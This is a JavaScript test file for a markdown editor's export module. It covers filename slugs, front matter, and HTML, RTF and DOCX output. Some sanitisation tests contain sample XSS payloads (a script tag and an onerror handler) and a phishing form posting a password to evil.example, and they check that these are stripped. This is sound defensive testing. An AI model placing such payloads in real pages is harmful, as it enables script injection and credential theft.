import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { JSDOM } from "jsdom";
import {
  GENERATOR_URL,
  buildHtmlDocument,
  buildMarkdownFile,
  buildRtfDocument,
  buildDocxBlob,
  cleanPreviewHtml,
  exportBasename,
} from "../../src/lib/export.js";

describe("exportBasename", () => {
  it("slugifies titles and falls back to markdown", () => {
    assert.equal(exportBasename("Hello World!"), "Hello-World");
    assert.equal(exportBasename(" "), "markdown");
    assert.equal(exportBasename(""), "Untitled");
    assert.equal(exportBasename("a".repeat(70)).length, 60);
  });
});

describe("buildMarkdownFile", () => {
  it("prepends title and generator front matter", () => {
    const out = buildMarkdownFile("# Hello", "My Doc");
    assert.match(out, /^---\n/);
    assert.match(out, /title: My Doc/);
    assert.ok(out.includes(`generator: ${GENERATOR_URL}`));
    assert.match(out, /# Hello/);
  });

  it("leaves existing front matter unchanged", () => {
    const src = "---\ntitle: x\n---\nBody";
    assert.equal(buildMarkdownFile(src, "Irrelevant"), src);
  });
});

describe("buildHtmlDocument", () => {
  it("embeds the body, escaped title, and generator meta", () => {
    const doc = buildHtmlDocument("<p>Hi</p>", "Test");
    assert.match(doc, /<!DOCTYPE html>/);
    assert.match(doc, /<title>Test<\/title>/);
    assert.match(doc, /<p>Hi<\/p>/);
    assert.ok(doc.includes(GENERATOR_URL));
    assert.match(buildHtmlDocument("", "<script>"), /&lt;script&gt;/);
  });
});

describe("DOM exporters", () => {
  /** @type {Window | undefined} */
  let previousWindow;

  function previewWith(html) {
    const { window: win } = new JSDOM("<!DOCTYPE html><html><body></body></html>", {
      url: "https://example.test/",
    });
    previousWindow = globalThis.window;
    globalThis.window = /** @type {Window} */ (/** @type {unknown} */ (win));
    // export.js walks Node constants via numeric nodeType on the element tree.
    const el = win.document.createElement("article");
    el.innerHTML = html;
    return el;
  }

  function restoreWindow() {
    if (previousWindow === undefined) delete globalThis.window;
    else globalThis.window = previousWindow;
    previousWindow = undefined;
  }

  it("cleans preview chrome from HTML exports", () => {
    try {
      const el = previewWith(
        `<h1 data-source-line="1">Hi</h1><mark class="speech-word">x</mark>` +
          `<button class="md-section-toggle">▼</button><p hidden>slide2</p>` +
          `<div class="mermaid" data-processed="true"><svg data-mermaid-natural="800" data-mermaid-fluid="1"></svg></div>`,
      );
      const html = cleanPreviewHtml(el);
      assert.doesNotMatch(html, /data-source-line/);
      assert.doesNotMatch(html, /speech-word/);
      assert.doesNotMatch(html, /md-section-toggle/);
      assert.doesNotMatch(html, /hidden/);
      assert.doesNotMatch(html, /data-processed/);
      assert.doesNotMatch(html, /data-mermaid-natural/);
      assert.doesNotMatch(html, /data-mermaid-fluid/);
      assert.match(html, /slide2/);
    } finally {
      restoreWindow();
    }
  });

  it("strips scripts and event handlers from export HTML", () => {
    try {
      const el = previewWith(
        `<p>ok</p><script>alert(1)</script><img src=x onerror="alert(1)">`,
      );
      const html = cleanPreviewHtml(el);
      const doc = buildHtmlDocument(html, "Safe");
      assert.doesNotMatch(html, /<script/i);
      assert.doesNotMatch(html, /onerror/i);
      assert.doesNotMatch(doc, /<script/i);
      assert.doesNotMatch(doc, /onerror/i);
      assert.match(html, /ok/);
    } finally {
      restoreWindow();
    }
  });

  it("strips phishing forms from export HTML", () => {
    try {
      const el = previewWith(
        `<p>ok</p><form action="https://evil.example/phish"><input name="p" type="password"><button type="submit">Sign in</button></form>`,
      );
      const html = cleanPreviewHtml(el);
      assert.doesNotMatch(html, /<form/i);
      assert.doesNotMatch(html, /<input/i);
      assert.doesNotMatch(html, /<button/i);
      assert.match(html, /ok/);
    } finally {
      restoreWindow();
    }
  });

  it("builds RTF with info block and generator", () => {
    try {
      const el = previewWith("<p>Hello</p>");
      const rtf = buildRtfDocument(el, "Doc");
      assert.match(rtf, /\{\\info/);
      assert.match(rtf, /Hello/);
    } finally {
      restoreWindow();
    }
  });

  it("builds a DOCX zip starting with PK", async () => {
    try {
      const el = previewWith("<p>Hello</p>");
      const blob = buildDocxBlob(el, "Doc");
      const buf = new Uint8Array(await blob.arrayBuffer());
      assert.equal(String.fromCharCode(buf[0], buf[1]), "PK");
    } finally {
      restoreWindow();
    }
  });
});
